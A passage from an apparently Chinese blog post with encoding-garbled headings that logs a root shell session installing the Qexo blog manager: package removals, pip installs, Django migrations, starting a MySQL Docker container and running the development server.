class="hljs-string">&#x27;/usr/share/netplan/netplan/cli/commands&#x27;</span> not empty so not removed<br>dpkg: warning: <span class="hljs-keyword">while</span> removing netplan.io, directory <span class="hljs-string">&#x27;/etc/netplan&#x27;</span> not empty so not removed<br>Removing software-properties-gtk (0.96.24.32.22) ...<br>Removing ubuntu-advantage-desktop-daemon (1.10.ubuntu0.18.04.1~esm1) ...<br>Removing ubuntu-advantage-tools (28.1~18.04) ...<br>Removing update-manager (1:18.04.11.13) ...<br>Removing update-notifier (3.192.1.19) ...<br>Removing update-notifier-common (3.192.1.19) ...<br>Removing update-manager-core (1:18.04.11.13) ...<br>dpkg: warning: <span class="hljs-keyword">while</span> removing update-manager-core, directory <span class="hljs-string">&#x27;/var/lib/update-manager&#x27;</span> not empty so not removed<br>Removing python3-yaml (3.12-1build2) ...<br>Removing ubuntu-release-upgrader-gtk (1:18.04.45) ...<br>(Reading database ... 278835 files and directories currently installed.)<br>Preparing to unpack .../python3-update-manager_1%3a18.04.13.1_all.deb ...<br>Unpacking python3-update-manager (1:18.04.13.1) over (1:18.04.11.13) ...<br>Setting up python3-update-manager (1:18.04.13.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> shared-mime-info (1.9-2) ...<br>Unknown media <span class="hljs-built_in">type</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;all/all&#x27;</span><br>Unknown media <span class="hljs-built_in">type</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;all/allfiles&#x27;</span><br>Processing triggers <span class="hljs-keyword">for</span> gnome-menus (3.13.3-11ubuntu1.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> dbus (1.12.2-1ubuntu1.4) ...<br>Processing triggers <span class="hljs-keyword">for</span> hicolor-icon-theme (0.17-2) ...<br>Processing triggers <span class="hljs-keyword">for</span> mime-support (3.60ubuntu1) ...<br>Processing triggers <span class="hljs-keyword">for</span> desktop-file-utils (0.23-1ubuntu3.18.04.2) ...<br>Processing triggers <span class="hljs-keyword">for</span> libglib2.0-0:amd64 (2.56.4-0ubuntu0.18.04.9) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.8.3-2ubuntu0.1) ...<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-6"><a href="#å›åˆ°ä¸»çº¿-6" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached Django-3.2.25-py3-none-any.whl.metadata (4.1 kB)<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached PyMySQL-1.0.2-py3-none-any.whl.metadata (5.1 kB)<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached boto3-1.34.44-py3-none-any.whl.metadata (6.6 kB)<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached requests-2.31.0-py3-none-any.whl.metadata (4.6 kB)<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached PyGithub-2.2.0-py3-none-any.whl.metadata (3.8 kB)<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached python_gitlab-4.4.0-py3-none-any.whl.metadata (7.7 kB)<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached html2text-2020.1.16-py3-none-any.whl.metadata (4.3 kB)<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (2.1 kB)<br>Requirement already satisfied: urllib3==1.26.18 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 9)) (1.26.18)<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached Markdown-3.5.2-py3-none-any.whl.metadata (7.0 kB)<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached djongo5-1.3.9-py3-none-any.whl.metadata (1.9 kB)<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached django_cors_headers-4.1.0-py3-none-any.whl.metadata (16 kB)<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (9.7 kB)<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached dnspython-2.2.1-py3-none-any.whl.metadata (4.9 kB)<br>Requirement already satisfied: sqlparse==0.2.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 15)) (0.2.4)<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.4 kB)<br>Requirement already satisfied: cryptography==42.0.4 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from -r requirements.txt (line 17)) (42.0.4)<br>Collecting pyopenssl==24.0.0 (from -r requirements.txt (line 18))<br>  Using cached pyOpenSSL-24.0.0-py3-none-any.whl.metadata (12 kB)<br>Collecting oss2==2.18.4 (from -r requirements.txt (line 19))<br>  Using cached oss2-2.18.4-py3-none-any.whl<br>Collecting beautifulsoup4==4.12.3 (from -r requirements.txt (line 20))<br>  Using cached beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)<br>Collecting upyun==2.5.5 (from -r requirements.txt (line 21))<br>  Using cached upyun-2.5.5-py3-none-any.whl<br>Collecting asgiref&lt;4,&gt;=3.3.2 (from Django==3.2.25-&gt;-r requirements.txt (line 1))<br>  Using cached asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)<br>Requirement already satisfied: pytz <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from Django==3.2.25-&gt;-r requirements.txt (line 1)) (2024.2)<br>Collecting botocore&lt;1.35.0,&gt;=1.34.44 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached botocore-1.34.162-py3-none-any.whl.metadata (5.7 kB)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-1.0.1-py3-none-any.whl.metadata (7.6 kB)<br>Collecting s3transfer&lt;0.11.0,&gt;=0.10.0 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached s3transfer-0.10.3-py3-none-any.whl.metadata (1.7 kB)<br>Collecting charset-normalizer&lt;4,&gt;=2 (from requests==2.31.0-&gt;-r requirements.txt (line 4))<br>  Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)<br>Requirement already satisfied: idna&lt;4,&gt;=2.5 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2.6)<br>Requirement already satisfied: certifi&gt;=2017.4.17 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from requests==2.31.0-&gt;-r requirements.txt (line 4)) (2018.1.18)<br>Collecting pynacl&gt;=1.4.0 (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)<br>Collecting pyjwt&gt;=2.4.0 (from pyjwt[crypto]&gt;=2.4.0-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached PyJWT-2.9.0-py3-none-any.whl.metadata (3.0 kB)<br>Requirement already satisfied: typing-extensions&gt;=4.0.0 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5)) (4.12.2)<br>Collecting Deprecated (from PyGithub==2.2.0-&gt;-r requirements.txt (line 5))<br>  Using cached Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)<br>Collecting requests-toolbelt&gt;=0.10.1 (from python-gitlab==4.4.0-&gt;-r requirements.txt (line 6))<br>  Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl.metadata (14 kB)<br>Collecting importlib-metadata&gt;=4.4 (from Markdown==3.5.2-&gt;-r requirements.txt (line 10))<br>  Using cached importlib_metadata-8.5.0-py3-none-any.whl.metadata (4.8 kB)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (1.17.1)<br>Requirement already satisfied: crcmod&gt;=1.7 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from oss2==2.18.4-&gt;-r requirements.txt (line 19)) (1.7)<br>Collecting pycryptodome&gt;=3.4.7 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)<br>Collecting aliyun-python-sdk-kms&gt;=2.4.1 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl.metadata (1.5 kB)<br>Collecting aliyun-python-sdk-core&gt;=2.13.12 (from oss2==2.18.4-&gt;-r requirements.txt (line 19))<br>  Using cached aliyun_python_sdk_core-2.16.0-py3-none-any.whl<br>Requirement already satisfied: six <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from oss2==2.18.4-&gt;-r requirements.txt (line 19)) (1.16.0)<br>Requirement already satisfied: soupsieve&gt;1.2 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from beautifulsoup4==4.12.3-&gt;-r requirements.txt (line 20)) (2.6)<br>Collecting jmespath&lt;2.0.0,&gt;=0.7.1 (from boto3==1.34.44-&gt;-r requirements.txt (line 3))<br>  Using cached jmespath-0.10.0-py2.py3-none-any.whl.metadata (8.0 kB)<br>Requirement already satisfied: python-dateutil&lt;3.0.0,&gt;=2.1 <span class="hljs-keyword">in</span> /usr/lib/python3/dist-packages (from botocore&lt;1.35.0,&gt;=1.34.44-&gt;boto3==1.34.44-&gt;-r requirements.txt (line 3)) (2.6.1)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from cffi&gt;=1.12-&gt;cryptography==42.0.4-&gt;-r requirements.txt (line 17)) (2.22)<br>Requirement already satisfied: zipp&gt;=3.20 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from importlib-metadata&gt;=4.4-&gt;Markdown==3.5.2-&gt;-r requirements.txt (line 10)) (3.20.2)<br>Requirement already satisfied: wrapt&lt;2,&gt;=1.10 <span class="hljs-keyword">in</span> /usr/local/lib/python3.8/dist-packages (from Deprecated-&gt;PyGithub==2.2.0-&gt;-r requirements.txt (line 5)) (1.16.0)<br>Using cached Django-3.2.25-py3-none-any.whl (7.9 MB)<br>Using cached PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>Using cached boto3-1.34.44-py3-none-any.whl (139 kB)<br>Using cached requests-2.31.0-py3-none-any.whl (62 kB)<br>Using cached PyGithub-2.2.0-py3-none-any.whl (350 kB)<br>Using cached python_gitlab-4.4.0-py3-none-any.whl (138 kB)<br>Using cached html2text-2020.1.16-py3-none-any.whl (32 kB)<br>Using cached PyYAML-6.0.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (736 kB)<br>Using cached Markdown-3.5.2-py3-none-any.whl (103 kB)<br>Using cached djongo5-1.3.9-py3-none-any.whl (51 kB)<br>Using cached django_cors_headers-4.1.0-py3-none-any.whl (12 kB)<br>Using cached pymongo-3.13.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (526 kB)<br>Using cached dnspython-2.2.1-py3-none-any.whl (269 kB)<br>Using cached psycopg2_binary-2.9.9-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.0 MB)<br>Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)<br>Using cached beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)<br>Using cached aliyun_python_sdk_kms-2.16.5-py2.py3-none-any.whl (99 kB)<br>Using cached asgiref-3.8.1-py3-none-any.whl (23 kB)<br>Using cached botocore-1.34.162-py3-none-any.whl (12.5 MB)<br>Using cached charset_normalizer-3.4.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)<br>Using cached importlib_metadata-8.5.0-py3-none-any.whl (26 kB)<br>Using cached jmespath-0.10.0-py2.py3-none-any.whl (24 kB)<br>Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)<br>Using cached PyJWT-2.9.0-py3-none-any.whl (22 kB)<br>Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)<br>Using cached requests_toolbelt-1.0.0-py2.py3-none-any.whl (54 kB)<br>Using cached s3transfer-0.10.3-py3-none-any.whl (82 kB)<br>Using cached Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)<br>WARNING: Error parsing dependencies of bcc: Invalid version: <span class="hljs-string">&#x27;0.24.0-8f40d6f5&#x27;</span><br>WARNING: Error parsing dependencies of distro-info: Invalid version: <span class="hljs-string">&#x27;0.18ubuntu0.18.04.1&#x27;</span><br>Installing collected packages: PyYAML, PyMySQL, pymongo, pyjwt, pycryptodome, psycopg2-binary, jmespath, importlib-metadata, html2text, dnspython, Deprecated, charset-normalizer, beautifulsoup4, asgiref, requests, pynacl, Markdown, Django, botocore, upyun, s3transfer, requests-toolbelt, pyopenssl, djongo5, django-cors-headers, aliyun-python-sdk-core, python-gitlab, PyGithub, boto3, aliyun-python-sdk-kms, oss2<br>Successfully installed Deprecated-1.2.14 Django-3.2.25 Markdown-3.5.2 PyGithub-2.2.0 PyMySQL-1.0.2 PyYAML-6.0.1 aliyun-python-sdk-core-2.16.0 aliyun-python-sdk-kms-2.16.5 asgiref-3.8.1 beautifulsoup4-4.12.3 boto3-1.34.44 botocore-1.34.162 charset-normalizer-3.4.0 django-cors-headers-4.1.0 djongo5-1.3.9 dnspython-2.2.1 html2text-2020.1.16 importlib-metadata-8.5.0 jmespath-0.10.0 oss2-2.18.4 psycopg2-binary-2.9.9 pycryptodome-3.21.0 pyjwt-2.9.0 pymongo-3.13.0 pynacl-1.5.0 pyopenssl-24.0.0 python-gitlab-4.4.0 requests-2.31.0 requests-toolbelt-1.0.0 s3transfer-0.10.3 upyun-2.5.5<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable.It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option <span class="hljs-keyword">if</span> you know what you are doing and want to suppress this warning.<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="ä¸»çº¿2"><a href="#ä¸»çº¿2" class="headerlink" title="ä¸»çº¿2"></a>ä¸»çº¿2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py makemigrations</span><br>è·å–æœ¬åœ°é…ç½®æ–‡ä»¶æˆåŠŸ, ä½¿ç”¨æœ¬åœ°æ•°æ®åº“é…ç½®<br>[02/Nov/2024 11:26:11] ERROR: Languageè·å–å¤±è´¥, é»˜è®¤ä¸ºzh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:26:11] ERROR: è·å–PROVIDERæ—¶å‡ºé”™: è·³è¿‡(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>å½“å‰ç¯å¢ƒ: æœ¬åœ°<br>/usr/local/lib/python3.8/dist-packages/django/core/management/commands/makemigrations.py:105: RuntimeWarning: Got an error checking a consistent migration <span class="hljs-built_in">history</span> performed <span class="hljs-keyword">for</span> database connection <span class="hljs-string">&#x27;default&#x27;</span>: (2003, <span class="hljs-string">&quot;Can&#x27;t connect to MySQL server on &#x27;192.168.20.201&#x27; ([Errno 111] Connection refused)&quot;</span>)<br>  warnings.warn(<br>No changes detected<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šå¯åŠ¨mysqlå®¹å™¨"><a href="#å°æ’æ›²ï¼šå¯åŠ¨mysqlå®¹å™¨" class="headerlink" title="å°æ’æ›²ï¼šå¯åŠ¨mysqlå®¹å™¨"></a>å°æ’æ›²ï¼šå¯åŠ¨mysqlå®¹å™¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker ps </span><br>CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker ps  -a</span><br>CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS                      PORTS     NAMES<br>933dad3ceaa4   mysql     <span class="hljs-string">&quot;docker-entrypoint.sâ€¦&quot;</span>   31 hours ago   Exited (0) 16 hours ago               qexo<br>b5a90d496b13   mysql     <span class="hljs-string">&quot;docker-entrypoint.sâ€¦&quot;</span>   31 hours ago   Exited (130) 31 hours ago             hungry_swartz<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># netstat -nltp |grep 3306</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker start  qexo</span><br>qexo<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># docker ps </span><br>CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS         PORTS                                                  NAMES<br>933dad3ceaa4   mysql     <span class="hljs-string">&quot;docker-entrypoint.sâ€¦&quot;</span>   31 hours ago   Up 3 seconds   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp   qexo<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># netstat -nltp |grep 3306</span><br>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      13530/docker-proxy  <br>tcp6       0      0 :::3306                 :::*                    LISTEN      13537/docker-proxy  <br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-7"><a href="#å›åˆ°ä¸»çº¿-7" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py makemigrations</span><br>è·å–æœ¬åœ°é…ç½®æ–‡ä»¶æˆåŠŸ, ä½¿ç”¨æœ¬åœ°æ•°æ®åº“é…ç½®<br>[02/Nov/2024 11:28:50] ERROR: Languageè·å–å¤±è´¥, é»˜è®¤ä¸ºzh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:28:50] ERROR: è·å–PROVIDERæ—¶å‡ºé”™: è·³è¿‡(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>å½“å‰ç¯å¢ƒ: æœ¬åœ°<br>No changes detected<br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py migrate</span><br>è·å–æœ¬åœ°é…ç½®æ–‡ä»¶æˆåŠŸ, ä½¿ç”¨æœ¬åœ°æ•°æ®åº“é…ç½®<br>[02/Nov/2024 11:29:40] ERROR: Languageè·å–å¤±è´¥, é»˜è®¤ä¸ºzh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:29:40] ERROR: è·å–PROVIDERæ—¶å‡ºé”™: è·³è¿‡(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>å½“å‰ç¯å¢ƒ: æœ¬åœ°<br>Operations to perform:<br>  Apply all migrations: auth, contenttypes, hexoweb, sessions<br>Running migrations:<br>  Applying contenttypes.0001_initial... OK<br>  Applying contenttypes.0002_remove_content_type_name... OK<br>  Applying auth.0001_initial... OK<br>  Applying auth.0002_alter_permission_name_max_length... OK<br>  Applying auth.0003_alter_user_email_max_length... OK<br>  Applying auth.0004_alter_user_username_opts... OK<br>  Applying auth.0005_alter_user_last_login_null... OK<br>  Applying auth.0006_require_contenttypes_0002... OK<br>  Applying auth.0007_alter_validators_add_error_messages... OK<br>  Applying auth.0008_alter_user_username_max_length... OK<br>  Applying auth.0009_alter_user_last_name_max_length... OK<br>  Applying auth.0010_alter_group_name_max_length... OK<br>  Applying auth.0011_update_proxy_permissions... OK<br>  Applying auth.0012_alter_user_first_name_max_length... OK<br>  Applying hexoweb.0001_initial... OK<br>  Applying hexoweb.0002_postmodel... OK<br>  Applying hexoweb.0003_imagemodel_deleteconfig... OK<br>  Applying sessions.0001_initial... OK<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py runserver --noreload</span><br>è·å–æœ¬åœ°é…ç½®æ–‡ä»¶æˆåŠŸ, ä½¿ç”¨æœ¬åœ°æ•°æ®åº“é…ç½®<br>Performing system checks...<br><br>[02/Nov/2024 11:29:55] ERROR: Languageè·å–å¤±è´¥, é»˜è®¤ä¸ºzh_CN(functions.py.&lt;module&gt;[line:60])<br>[02/Nov/2024 11:29:55] ERROR: è·å–PROVIDERæ—¶å‡ºé”™: è·³è¿‡(functions.py.&lt;module&gt;[line:79])<br>           _               _ <br>     /\   | |             | |<br>    /  \  | |__  _   _  __| |_   _ <br>   / /\ \ | |_ \| | | |/ _| | | | |<br>  / ____ \| |_) | |_| | (_| | |_| |<br> /_/    \_\____/ \____|\____|\____|<br>å½“å‰ç¯å¢ƒ: æœ¬åœ°<br>System check identified no issues (0 silenced).<br>November 02, 2024 - 11:29:55<br>Django version 3.2.25, using settings <span class="hljs-string">&#x27;core.settings&#x27;</span><br>Starting development server at http://127.0.0.1:8000/<br>Quit the server with CONTROL-C.<br></code></pre></td></tr></table></figure><h3 id="æˆåŠŸå•¦"><a href="#æˆåŠŸå•¦" class="headerlink" title="æˆåŠŸå•¦~"></a>æˆåŠŸå•¦~</h3><p>ä¸Šé¢è¿™æ ·åªèƒ½è·‘åœ¨127.0.0.1ï¼Œä¸‹é¢è¿™æ ·å¯ä»¥è·‘åœ¨0.0.0.0ä¸Š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@ningan</span> Qexo-3.4.1]<span class="hljs-comment"># python3.8 manage.py runserver 0.0.0.0:8000 --noreload</span><br>è·å–æœ¬åœ°é…ç½®æ–‡ä»¶æˆåŠŸ, ä½¿ç”¨æœ¬åœ°æ•°æ®åº“é…ç½®<br>Performing system checks...<br><br>[02/Nov/2024 11:37:14] ERROR: è·å–PROVIDERæ—¶å‡ºé”™: è·³è¿‡(functions.py.<span 